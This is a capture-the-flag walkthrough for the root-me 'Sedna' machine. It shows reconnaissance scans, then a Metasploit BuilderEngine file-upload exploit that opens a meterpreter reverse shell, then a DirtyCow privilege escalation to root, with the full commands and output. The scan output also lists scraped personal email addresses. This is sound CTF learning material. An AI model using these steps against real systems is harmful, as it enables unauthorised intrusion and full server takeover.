@@ -1,0 +1,250 @@
+Sedna
+time taken: 3 hours
+
+nmap:
+
+
+Nmap scan report for ctf9.root-me.org (212.129.28.16)
+Host is up (0.030s latency).
+Other addresses for ctf9.root-me.org (not scanned): 2001:bc8:35b0:27::100
+rDNS record for 212.129.28.16: www.root-me.org
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+25/tcp  closed smtp
+80/tcp  open   http     nginx
+|_http-server-header: nginx
+|_http-title: Did not follow redirect to http://www.root-me.org/
+443/tcp open   ssl/http nginx
+|_http-server-header: nginx
+|_http-title: Did not follow redirect to https://www.root-me.org/
+| ssl-cert: Subject: commonName=root-me.org
+| Subject Alternative Name: DNS:root-me.org
+| Not valid before: 2017-06-25T03:46:00
+|_Not valid after:  2017-09-23T03:46:00
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg: 
+|_  http/1.1
+Device type: general purpose|bridge|printer
+Running (JUST GUESSING): QEMU (97%), Oracle Virtualbox (96%), Dell embedded (87%)
+OS CPE: cpe:/a:qemu:qemu cpe:/o:oracle:virtualbox cpe:/h:dell:1600n
+Aggressive OS guesses: QEMU user mode network gateway (97%), Oracle Virtualbox (96%), Dell 1600n printer (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   1.92 ms 10.0.2.2
+2   2.11 ms www.root-me.org (212.129.28.16)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.71 seconds
+
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+uniscan:
+
+Scan date: 2-8-2017 14:23:14
+===================================================================================================
+| Domain: http://ctf02.root-me.org/
+| Server: Apache/2.4.7 (Ubuntu)
+| IP: 212.129.28.21
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf02.root-me.org/blocks/
+| [+] CODE: 200 URL: http://ctf02.root-me.org/files/
+| [+] CODE: 200 URL: http://ctf02.root-me.org/modules/
+| [+] CODE: 200 URL: http://ctf02.root-me.org/system/
+| [+] CODE: 200 URL: http://ctf02.root-me.org/themes/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf02.root-me.org/index.html
+| [+] CODE: 200 URL: http://ctf02.root-me.org/license.txt
+| [+] CODE: 200 URL: http://ctf02.root-me.org/robots.txt
+===================================================================================================
+|
+| Check robots.txt:
+| [+] User-Agent: *
+| [+] Disallow: Hackers
+| [+] 
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| [+] Crawling finished, 968 URL's found!
+|
+| File Upload Forms:
+|
+| Source Code Disclosure:
+| [+] Source Code Found: http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/doc/SIM.markdown
+| [+] Source Code Found: http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/resources/ControllerTemplate.phpt
+| [+] Source Code Found: http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/genclass.sh
+| [+] Source Code Found: http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/scripts/generateObjectsFromXsd.sh
+| [+] Source Code Found: http://ctf02.root-me.org/themes/default_theme_2015/plugins/pace/Gruntfile.coffee
+| [+] Source Code Found: http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/scripts/generateControllersFromTemplate.sh
+| [+] Source Code Found: http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/scripts/masterUpdate.sh
+|
+| FCKeditor File Upload:
+|
+| Timthumb:
+|
+| PHPinfo() Disclosure:
+|
+| External hosts:
+| [+] External Host Found: http://ajax.googleapis.com
+| [+] External Host Found: http://www.builderengine.com
+| [+] External Host Found: http://demo.builderengine.com
+|
+| Web Backdoors:
+|
+| E-mails:
+| [+] E-mail Found: your@email.com
+| [+] E-mail Found: contacto@procert.net.ve
+| [+] E-mail Found: adam.flynn.schwartz@gmail.com
+| [+] E-mail Found: ca@firmaprofesional.com
+| [+] E-mail Found: hello@mysite.com
+| [+] E-mail Found: info@netlock.hu
+| [+] E-mail Found: foo@example.com
+| [+] E-mail Found: info@builderengine.com
+| [+] E-mail Found: info@e-szigno.hu
+| [+] E-mail Found: stukabakoff@gmail.com
+| [+] E-mail Found: info@valicert.com
+| [+] E-mail Found: mr.lee@terrenceishere.com
+| [+] E-mail Found: user@domain.com
+| [+] E-mail Found: igca@sgdn.pm.gouv.fr
+| [+] E-mail Found: hostmaster@spi-inc.org
+| [+] E-mail Found: premium-server@thawte.com
+| [+] E-mail Found: pki@sk.ee
+| [+] E-mail Found: zackbloom@gmail.com
+| [+] E-mail Found: server-certs@thawte.com
+|
+| Ignored Files: 
+| http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/README.md
+| http://ctf02.root-me.org/modules/builderpayment/controllers/authorizelib/license.md
+===================================================================================================
+.
+.
+.
+
+turns out a shell can be uploaded using this vulnerability:
+
+https://www.exploit-db.com/exploits/40390/
+
+search for BuilderEngine in Metasploit:
+
+msf exploit(builderengine_upload_exec) > show options
+
+Module options (exploit/multi/http/builderengine_upload_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST      212.129.28.21    yes       The target address
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to BuilderEngine
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   BuilderEngine 3.5.0
+
+
+msf exploit(builderengine_upload_exec) > set lhost (PUBLIC IP ADDRESS)
+lhost => (PUBLIC IP ADDRESS)
+msf exploit(builderengine_upload_exec) > set reverselistenerbindaddress 10.0.2.15
+reverselistenerbindaddress => 10.0.2.15
+msf exploit(builderengine_upload_exec) > set lport 32928
+lport => 32928
+msf exploit(builderengine_upload_exec) > exploit
+
+[*] Started reverse TCP handler on 10.0.2.15:32928 
+[+] Our payload is at: AbZtniHSYBTTiF.php. Calling payload...
+[*] Calling payload...
+[*] Sending stage (33986 bytes) to 10.0.2.2
+[*] Meterpreter session 1 opened (10.0.2.15:32928 -> 10.0.2.2:57455) at 2017-08-02 14:53:16 -0600
+[+] Deleted AbZtniHSYBTTiF.php
+
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter > shell
+Process 9826 created.
+Channel 0 created.
+
+python -c 'import pty; pty.spawn("/bin/bash")' <--get a little bit of a better shell
+
+www-data@Sedna:/var/www/html/files$ cat /etc/passwd | grep bash
+cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
+ok so no users that I will likely get a ssh password for....
+
+www-data@Sedna:/var/www/html/files$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/ping
+/bin/umount
+.
+.
+.
+nothing jumps out immediately aside from nfs, which doesn't seem to work remotely...
+
+after some tries, I used this dirtyc0w exploit at:
+https://pastebin.com/raw/YFBedGkc 
+
+www-data@Sedna:/tmp$ gcc cowroot.c -o cowroot -pthread
+gcc cowroot.c -o cowroot -pthread
+cowroot.c: In function 'procselfmemThread':
+cowroot.c:99:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
+         lseek(f,map,SEEK_SET);
+         ^
+In file included from cowroot.c:28:0:
+/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
+ extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
+                ^
+cowroot.c: In function 'main':
+cowroot.c:142:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
+     printf("Size of binary: %d\n", st.st_size);
+     ^
+www-data@Sedna:/tmp$ ./cowroot
+./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 45420
+Racing, this may take a while..
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+thread stopped
+root@Sedna:/tmp# id
+id
+uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
+
+easy privesc
